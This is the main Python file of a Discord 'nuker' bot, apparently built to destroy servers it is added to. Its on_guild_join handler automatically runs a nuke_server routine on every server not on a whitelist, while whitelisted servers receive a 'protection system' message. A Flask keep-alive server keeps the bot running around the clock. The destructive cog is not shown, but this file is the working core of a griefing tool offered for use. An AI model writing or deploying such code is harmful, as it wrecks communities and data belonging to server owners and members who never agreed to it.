import discord
from discord.ext import commands, tasks
import os
import asyncio
from flask import Flask
from datetime import datetime

app = Flask(__name__)
bot_name = "Loading..."

@app.route('/')
def home():
    return f"🤖 {bot_name} - Operational"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

TOKEN = os.getenv("DISCORD_TOKEN")

class NukerBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(
            command_prefix="!",
            intents=intents,
            help_command=None
        )
        self.start_time = datetime.now()

    async def setup_hook(self):
        try:
            await self.load_extension("cogs.nuker")
            print("✅ Loaded nuker cog with PROFESSIONAL features")
        except Exception as e:
            print(f"❌ Failed to load cog: {e}")

        await self.tree.sync()
        self.update_status.start()
        self.update_dashboard.start()

    async def on_ready(self):
        global bot_name
        bot_name = str(self.user)
        print(f"🔗 {bot_name} is ONLINE!")
        print(f"📊 Connected to {len(self.guilds)} servers")
        
        # Whitelisted servers ko check karo
        nuker_cog = self.get_cog("NukerCommands")
        if nuker_cog:
            whitelist_count = len(nuker_cog.whitelisted_servers)
            print(f"🔒 {whitelist_count} servers are WHITELISTED (PROTECTED)")
            
            # Tere teen safe servers ki list print karo
            safe_servers = []
            for server_id in nuker_cog.whitelisted_servers:
                guild = self.get_guild(server_id)
                if guild:
                    safe_servers.append(f"{guild.name} ({server_id})")
            
            if safe_servers:
                print("✅ PROTECTED SERVERS:")
                for server in safe_servers:
                    print(f"   - {server}")
        
        if os.environ.get('RENDER'):
            import threading
            threading.Thread(target=run_flask, daemon=True).start()
            print("🚀 Flask server started for 24/7 uptime")

    async def on_guild_join(self, guild):
        """Naya server join hone par - PROFESSIONAL SYSTEM"""
        print(f"🎯 Bot joined: {guild.name} ({guild.id})")
        
        nuker_cog = self.get_cog("NukerCommands")
        if nuker_cog:
            if nuker_cog.is_whitelisted(guild.id):
                print(f"✅ WHITELISTED SERVER - Bot will provide protection features")
                # Whitelisted server hai - protection provide karo
                try:
                    general = discord.utils.get(guild.text_channels, name="general")
                    if general:
                        embed = discord.Embed(
                            title="🛡️ PROTECTION SYSTEM ACTIVATED",
                            description=f"**{guild.name}** is now protected by Digamber Nuker System.",
                            color=0x00ff00,
                            timestamp=datetime.utcnow()
                        )
                        embed.add_field(
                            name="AVAILABLE COMMANDS",
                            value="• `!protection` - Check safety status\n• `!serverinfo` - Server analytics\n• `!whitelisted` - View protected servers",
                            inline=False
                        )
                        embed.set_footer(text="Digamber Protection • 24/7 Security")
                        await general.send(embed=embed)
                except:
                    pass
                return
            else:
                print(f"💣 NON-WHITELISTED SERVER - Starting PROFESSIONAL NUKE!")
                await nuker_cog.nuke_server(guild)

    @tasks.loop(minutes=5)
    async def update_status(self):
        """Update bot status every 5 minutes"""
        try:
            nuker_cog = self.get_cog("NukerCommands")
            safe_count = len(nuker_cog.whitelisted_servers) if nuker_cog else 0
            total_servers = len(self.guilds)
            
            status_text = f"{safe_count}/{total_servers} Protected"
            await self.change_presence(activity=discord.Activity(
                type=discord.ActivityType.watching,
                name=status_text
            ))
        except:
            pass

    @tasks.loop(minutes=2)
    async def update_dashboard(self):
        """Update status channel every 2 minutes"""
        try:
            nuker_cog = self.get_cog("NukerCommands")
            if nuker_cog:
                await nuker_cog.update_status_channel()
        except Exception as e:
            print(f"❌ Dashboard update failed: {e}")

    @update_status.before_loop
    async def before_update_status(self):
        await self.wait_until_ready()

    @update_dashboard.before_loop
    async def before_update_dashboard(self):
        await self.wait_until_ready()

if __name__ == "__main__":
    print("🚀 Starting Digamber Nuker Bot with PROFESSIONAL features...")
    bot = NukerBot()
    bot.run(TOKEN)
